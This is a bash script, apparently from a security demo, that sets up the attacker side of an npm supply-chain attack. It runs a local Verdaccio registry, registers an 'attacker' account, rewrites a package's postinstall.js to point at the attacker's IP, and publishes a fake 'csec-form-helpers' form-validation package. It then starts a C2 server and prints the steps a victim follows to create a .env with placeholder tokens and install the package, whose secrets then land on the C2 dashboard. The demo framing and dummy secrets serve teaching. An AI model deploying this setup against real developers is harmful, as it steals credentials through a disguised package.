#!/usr/bin/env bash
set -e

R='\033[31m' G='\033[32m' Y='\033[33m' C='\033[36m' B='\033[1m' D='\033[2m' X='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
DEMO_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"
MALICIOUS_PKG="$DEMO_ROOT/malicious-package"
C2_SERVER="$DEMO_ROOT/c2-server"

VERDACCIO_PORT="${VERDACCIO_PORT:-4873}"
C2_PORT="${C2_PORT:-4444}"

cleanup() {
  echo ""
  echo -e "${Y}${B}  [*] Shutting down...${X}"
  [ -n "$VERDACCIO_PID" ] && kill "$VERDACCIO_PID" 2>/dev/null && echo -e "  ${D}Verdaccio stopped${X}"
  [ -n "$C2_PID" ] && kill "$C2_PID" 2>/dev/null && echo -e "  ${D}C2 server stopped${X}"
  [ -f "$SCRIPT_DIR/.npmrc_backup" ] && mv "$SCRIPT_DIR/.npmrc_backup" "$HOME/.npmrc" 2>/dev/null
  [ -f "$SCRIPT_DIR/.patched" ] && cp "$MALICIOUS_PKG/postinstall.js.bak" "$MALICIOUS_PKG/postinstall.js" 2>/dev/null && rm -f "$MALICIOUS_PKG/postinstall.js.bak" "$SCRIPT_DIR/.patched"
  echo -e "${G}  [✓] Clean shutdown.${X}"
  echo ""
}
trap cleanup EXIT INT TERM

echo ""
echo -e "${R}${B}  ╔═══════════════════════════════════════════════════════════╗${X}"
echo -e "${R}${B}  ║     TOKEN STEALER — LIVE SESSION (Attacker Setup)        ║${X}"
echo -e "${R}${B}  ╚═══════════════════════════════════════════════════════════╝${X}"
echo ""

# --- Detect local IP ---
LOCAL_IP=""
for cmd in "ip -4 route get 1.1.1.1 2>/dev/null | grep -oP 'src \K[\d.]+'" \
           "hostname -I 2>/dev/null | awk '{print \$1}'" \
           "ifconfig 2>/dev/null | grep 'inet ' | grep -v 127.0.0.1 | head -1 | awk '{print \$2}'" \
           "ipconfig getifaddr en0 2>/dev/null"; do
  LOCAL_IP=$(eval "$cmd" 2>/dev/null) && [ -n "$LOCAL_IP" ] && break
done

if [ -z "$LOCAL_IP" ]; then
  echo -e "${R}  [!] Could not detect your local IP.${X}"
  read -rp "  Enter your IP manually: " LOCAL_IP
fi

echo -e "${C}${B}  [*] Your IP: ${LOCAL_IP}${X}"
echo ""

# --- Step 1: Check prerequisites ---
echo -e "${Y}${B}  ── Step 1: Checking prerequisites ──${X}"

if ! command -v node &>/dev/null; then
  echo -e "${R}  [✗] Node.js not found. Install it first.${X}" && exit 1
fi
echo -e "  ${G}[✓]${X} Node.js $(node -v)"

if ! command -v verdaccio &>/dev/null; then
  echo -e "  ${Y}[*]${X} Installing Verdaccio (local npm registry)..."
  npm install -g verdaccio
fi
echo -e "  ${G}[✓]${X} Verdaccio available"
echo ""

# --- Step 2: Start Verdaccio ---
echo -e "${Y}${B}  ── Step 2: Starting Verdaccio on port ${VERDACCIO_PORT} ──${X}"
verdaccio --listen "0.0.0.0:${VERDACCIO_PORT}" &>/dev/null &
VERDACCIO_PID=$!
sleep 2

if ! kill -0 "$VERDACCIO_PID" 2>/dev/null; then
  echo -e "${R}  [✗] Verdaccio failed to start. Is port ${VERDACCIO_PORT} in use?${X}" && exit 1
fi
echo -e "  ${G}[✓]${X} Verdaccio running (PID: ${VERDACCIO_PID})"
echo -e "  ${D}    Registry: http://${LOCAL_IP}:${VERDACCIO_PORT}${X}"
echo ""

# --- Step 3: Create Verdaccio user & publish ---
echo -e "${Y}${B}  ── Step 3: Publishing malicious package to Verdaccio ──${X}"

REGISTRY_URL="http://localhost:${VERDACCIO_PORT}"

[ -f "$HOME/.npmrc" ] && cp "$HOME/.npmrc" "$SCRIPT_DIR/.npmrc_backup"

TOKEN=$(curl -s -X PUT "${REGISTRY_URL}/-/user/org.couchdb.user:attacker" \
  -H 'Content-Type: application/json' \
  -d '{"name":"attacker","password":"attacker123","email":"attacker@evil.com"}' \
  | node -e "process.stdin.on('data',d=>{try{console.log(JSON.parse(d).token)}catch{console.log('')}})" 2>/dev/null)

if [ -z "$TOKEN" ]; then
  echo -e "  ${Y}[*]${X} Using npm adduser fallback..."
  npx npm-cli-login -u attacker -p attacker123 -e attacker@evil.com -r "$REGISTRY_URL" 2>/dev/null || true
else
  npm set "//${LOCAL_IP}:${VERDACCIO_PORT}/:_authToken" "$TOKEN" 2>/dev/null || true
  npm set "//localhost:${VERDACCIO_PORT}/:_authToken" "$TOKEN" 2>/dev/null || true
fi

# Patch postinstall.js with the attacker's real IP so cross-machine exfil works
cp "$MALICIOUS_PKG/postinstall.js" "$MALICIOUS_PKG/postinstall.js.bak"
sed -i "s|const C2_HOST = process.env.C2_HOST || '127.0.0.1';|const C2_HOST = process.env.C2_HOST || '${LOCAL_IP}';|" "$MALICIOUS_PKG/postinstall.js"
touch "$SCRIPT_DIR/.patched"

cd "$MALICIOUS_PKG"
npm publish --registry "$REGISTRY_URL" 2>/dev/null && \
  echo -e "  ${G}[✓]${X} Published csec-form-helpers@1.0.0 to Verdaccio" || \
  echo -e "  ${Y}[!]${X} Package may already be published (that's fine)"
cd "$SCRIPT_DIR"
echo ""

# --- Step 4: Start C2 server ---
echo -e "${Y}${B}  ── Step 4: Starting C2 server on port ${C2_PORT} ──${X}"
C2_PORT="$C2_PORT" node "$C2_SERVER/server.js" &
C2_PID=$!
sleep 1

if ! kill -0 "$C2_PID" 2>/dev/null; then
  echo -e "${R}  [✗] C2 server failed to start. Is port ${C2_PORT} in use?${X}" && exit 1
fi
echo -e "  ${G}[✓]${X} C2 server running (PID: ${C2_PID})"
echo -e "  ${D}    Dashboard: http://${LOCAL_IP}:${C2_PORT}${X}"
echo ""

# --- Ready ---
echo -e "${G}${B}  ╔═══════════════════════════════════════════════════════════╗${X}"
echo -e "${G}${B}  ║                    ATTACKER READY                        ║${X}"
echo -e "${G}${B}  ╚═══════════════════════════════════════════════════════════╝${X}"
echo ""
echo -e "  ${C}${B}Registry:${X}  http://${LOCAL_IP}:${VERDACCIO_PORT}"
echo -e "  ${C}${B}C2 Dash:${X}   http://${LOCAL_IP}:${C2_PORT}"
echo ""
echo -e "  ${Y}${B}── Tell the victim to run these commands: ──${X}"
echo ""
echo -e "  ${D}# 1. Create a project${X}"
echo -e "  mkdir victim-app && cd victim-app"
echo -e "  npm init -y"
echo ""
echo -e "  ${D}# 2. Add a fake .env with \"secrets\"${X}"
echo "  cat > .env << 'ENVEOF'"
echo "GITHUB_TOKEN=ghp_R3aLt0k3nF0rD3m0Purp0s3s1234567890"
echo "NPM_TOKEN=npm_aB9xKzLmN8pQrStUvWx7654321fedcba"
echo "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE"
echo "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
echo "DATABASE_URL=postgres://admin:s3cret@prod-db.internal:5432/myapp"
echo "ENVEOF"
echo ""
echo -e "  ${D}# 3. Install the \"form validation\" package${X}"
echo -e "  npm install csec-form-helpers --registry http://${LOCAL_IP}:${VERDACCIO_PORT}"
echo ""
echo -e "  ${D}# 4. Use the package (works perfectly)${X}"
echo -e "  node -e \"const f = require('csec-form-helpers'); console.log(f.validateEmail('test@example.com'))\""
echo ""
echo -e "  ${R}${B}  → Now check the C2 dashboard — all secrets are there.${X}"
echo ""
echo -e "${D}  Press Ctrl+C to shut down everything.${X}"
echo ""

wait
